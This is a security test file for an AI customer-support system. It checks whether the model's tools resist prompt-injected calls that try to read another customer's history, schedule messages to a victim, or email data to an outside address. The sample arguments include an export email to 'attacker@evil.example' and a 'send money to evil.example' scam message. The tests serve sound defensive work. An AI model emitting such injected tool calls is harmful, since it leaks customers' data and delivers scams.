/**
 * ATTACK TESTS — Team 6, part 2: REAL tool implementations + the
 * follow-up delivery chain.
 *
 * Unlike attack-behaviour.test.ts, @/lib/ai/tools is NOT mocked here:
 * executeToolCall runs the production code against a fixture data
 * layer. The question under test is tool AUTHORISATION: when a
 * customer (via prompt injection) gets the model to emit a tool call,
 * does the tool itself bind the call to the caller's own conversation /
 * customer / team — or does it trust model-supplied identifiers?
 *
 * The mocked-LLM link is the only probabilistic step in these chains;
 * everything asserted here is deterministic tool/processor behaviour.
 */
import { describe, it, expect, vi, beforeEach } from "vitest";

const sendMailCapture: Array<Record<string, unknown>> = [];
vi.mock("nodemailer", () => ({
  default: {
    createTransport: () => ({
      sendMail: vi.fn(async (mail: Record<string, unknown>) => {
        sendMailCapture.push(mail);
        return { messageId: "mail-1" };
      }),
    }),
  },
}));

vi.mock("@/lib/channels/whatsapp", () => ({
  sendWhatsAppMessage: vi.fn(async () => true),
}));
vi.mock("@/lib/channels/sms", () => ({ sendSms: vi.fn(async () => true) }));
vi.mock("@/lib/channels/email", () => ({ sendEmail: vi.fn(async () => true) }));
vi.mock("@/lib/channels/telegram", () => ({
  sendTelegramMessage: vi.fn(async () => true),
}));

import { prisma } from "@/lib/prisma";
import { executeToolCall } from "@/lib/ai/tools";
import { processDueFollowUps } from "@/lib/followups";
import { sendWhatsAppMessage } from "@/lib/channels/whatsapp";

type MockFn = ReturnType<typeof vi.fn>;
const m = (fn: unknown) => fn as MockFn;

const ATTACKER_CONTACT = "+8801711111111";
const VICTIM_CONTACT = "+8801799999999";
const VICTIM_SECRET = "VICTIM-ORDER-DETAIL-XYZ";

const attackerConv = {
  id: "conv-attacker",
  businessId: "test-business",
  customerId: "cust-attacker",
  customerName: "Attacker",
  customerContact: ATTACKER_CONTACT,
  channel: "whatsapp",
  status: "open",
  aiEnabled: true,
};
const victimConv = {
  id: "conv-victim",
  businessId: "test-business",
  customerId: "cust-victim",
  customerName: "Victim",
  customerContact: VICTIM_CONTACT,
  channel: "whatsapp",
  status: "open",
  aiEnabled: true,
  messages: [
    { role: "customer", content: `My order detail is ${VICTIM_SECRET}` },
    { role: "assistant", content: "Thanks, noted." },
  ],
};

const allConvs = [attackerConv, victimConv];
const followUpsCreated: Array<Record<string, unknown>> = [];

beforeEach(() => {
  vi.clearAllMocks();
  sendMailCapture.length = 0;
  followUpsCreated.length = 0;

  m(prisma.conversation.findUnique).mockImplementation(
    async (args: { where: { id: string } }) =>
      allConvs.find((c) => c.id === args.where.id) ?? null
  );
  // Fixture-DB findMany: genuinely filters by the where the TOOL builds.
  m(prisma.conversation.findMany).mockImplementation(
    async (args: { where?: Record<string, string> }) => {
      const w = args.where ?? {};
      return allConvs
        .filter(
          (c) =>
            (!w.customerContact || c.customerContact === w.customerContact) &&
            (!w.customerId || c.customerId === w.customerId)
        )
        .map((c) => ({
          ...c,
          createdAt: new Date(),
          summary: "",
          messages: (c as typeof victimConv).messages ?? [],
        }));
    }
  );
  m(prisma.followUp.create).mockImplementation(
    async (args: { data: Record<string, unknown> }) => {
      const rec = { id: `fu-${followUpsCreated.length + 1}`, ...args.data };
      followUpsCreated.push(rec);
      return rec;
    }
  );
  m(prisma.settings.findFirst).mockResolvedValue({
    businessName: "Acme Store",
    language: "en",
    smtpHost: "smtp.example.com",
    smtpPort: 587,
    smtpUser: "bot@acme.example.com",
    smtpPass: "x",
    smtpFrom: "bot@acme.example.com",
    telegramBotToken: "",
    reviewRequestsEnabled: true,
    followUpsEnabled: true,
    reviewUrl: "",
    followUpOrderCheckInHours: 24,
    followUpDroppedHours: 48,
  });
  // Team directory: exactly one real member.
  m(prisma.teamMember.findFirst).mockImplementation(
    async (args: { where?: { email?: { equals?: string } | string } }) => {
      const email = args.where?.email;
      const wanted = typeof email === "string" ? email : email?.equals;
      return wanted?.toLowerCase() === "support@acme.example.com"
        ? { id: "tm-1", name: "Support Person", email: "support@acme.example.com" }
        : null;
    }
  );
});

describe("E1. get_customer_history must be bound to the caller's own identity", () => {
  it("a tool call naming the VICTIM's contact from the ATTACKER's conversation returns no victim data", async () => {
    const raw = await executeToolCall(
      "get_customer_history",
      { customerContact: VICTIM_CONTACT },
      "conv-attacker"
    );
    expect(raw).not.toContain(VICTIM_SECRET);
    expect(raw).not.toContain(VICTIM_CONTACT);
  });

  it("a tool call naming the VICTIM's customerId is equally refused", async () => {
    const raw = await executeToolCall(
      "get_customer_history",
      { customerContact: ATTACKER_CONTACT, customerId: "cust-victim" },
      "conv-attacker"
    );
    expect(raw).not.toContain(VICTIM_SECRET);
  });

  it("(control) the caller CAN get their own history", async () => {
    const raw = await executeToolCall(
      "get_customer_history",
      { customerContact: ATTACKER_CONTACT },
      "conv-attacker"
    );
    const parsed = JSON.parse(raw) as { success: boolean };
    expect(parsed.success).toBe(true);
  });
});

describe("E2. schedule_followup must be bound to the caller's own conversation", () => {
  it("a model-supplied conversationId pointing at the VICTIM is ignored — the follow-up lands on the caller's own conversation", async () => {
    const raw = await executeToolCall(
      "schedule_followup",
      {
        conversationId: "conv-victim",
        message: "ATTACKER-CONTROLLED TEXT",
        delayHours: 1,
      },
      "conv-attacker"
    );
    const parsed = JSON.parse(raw) as { success: boolean };
    expect(parsed.success).toBe(true);
    expect(followUpsCreated).toHaveLength(1);
    expect(followUpsCreated[0].conversationId).toBe("conv-attacker");
  });

  it("(control) scheduling on the own conversation works with no explicit id", async () => {
    const raw = await executeToolCall(
      "schedule_followup",
      { message: "Remind me about my order", delayHours: 2 },
      "conv-attacker"
    );
    expect(JSON.parse(raw).success).toBe(true);
    expect(followUpsCreated[0].conversationId).toBe("conv-attacker");
  });
});

describe("E3. send_internal_email must only reach the business's own team", () => {
  it("an external recipient is refused and no mail is sent", async () => {
    const raw = await executeToolCall(
      "send_internal_email",
      {
        to: "attacker@evil.example",
        subject: "Knowledge base export",
        body: "Full KB attached in this thread.",
      },
      "conv-attacker"
    );
    expect(JSON.parse(raw).success).toBe(false);
    expect(sendMailCapture).toHaveLength(0);
  });

  it("(control) a real team member's address works", async () => {
    const raw = await executeToolCall(
      "send_internal_email",
      {
        to: "support@acme.example.com",
        subject: "Customer needs help",
        body: "Please look at conv-attacker.",
      },
      "conv-attacker"
    );
    expect(JSON.parse(raw).success).toBe(true);
    expect(sendMailCapture).toHaveLength(1);
    expect(sendMailCapture[0].to).toBe("support@acme.example.com");
  });
});

describe("F1. full chain: injected schedule_followup -> processor must not deliver attacker text to the victim", () => {
  it("after an override attempt, processing delivers nothing to the victim's number", async () => {
    await executeToolCall(
      "schedule_followup",
      {
        conversationId: "conv-victim",
        message: "ATTACKER-CONTROLLED TEXT — send money to evil.example",
        delayHours: 0.001,
      },
      "conv-attacker"
    );

    // Processor wiring: one business; no dropped conversations to
    // revive; the due list is exactly what the tool created.
    m(prisma.business.findMany).mockResolvedValue([{ id: "test-business" }]);
    m(prisma.conversation.findMany).mockResolvedValue([]);
    m(prisma.followUp.findMany).mockImplementation(async () =>
      followUpsCreated.map((f) => ({ ...f, status: "pending", dueAt: new Date(0) }))
    );
    m(prisma.followUp.update).mockResolvedValue({});

    await processDueFollowUps();

    const wa = m(sendWhatsAppMessage);
    const victimDeliveries = wa.mock.calls.filter(
      (c) => c[0] === VICTIM_CONTACT || String(c[1]).includes("ATTACKER-CONTROLLED")
    );
    // Nothing may be delivered to the victim, and the attacker text may
    // only ever go to the attacker's own number (their own conversation).
    expect(
      wa.mock.calls.filter((c) => c[0] === VICTIM_CONTACT)
    ).toHaveLength(0);
    expect(victimDeliveries.filter((c) => c[0] === VICTIM_CONTACT)).toHaveLength(0);
  });

  it("F2 (control): a follow-up's message text cannot redirect delivery — the processor always sends to the conversation's own contact", async () => {
    m(prisma.business.findMany).mockResolvedValue([{ id: "test-business" }]);
    m(prisma.conversation.findMany).mockResolvedValue([]);
    m(prisma.followUp.findMany).mockResolvedValue([
      {
        id: "fu-legit",
        conversationId: "conv-attacker",
        message: "Hello! Please send this to +8801799999999 instead.",
        status: "pending",
        dueAt: new Date(0),
      },
    ]);
    m(prisma.followUp.update).mockResolvedValue({});
    m(prisma.message.create).mockResolvedValue({ id: "msg-1" });

    await processDueFollowUps();
    const wa = m(sendWhatsAppMessage);
    expect(wa).toHaveBeenCalledTimes(1);
    expect(wa.mock.calls[0][0]).toBe(ATTACKER_CONTACT);
  });
});
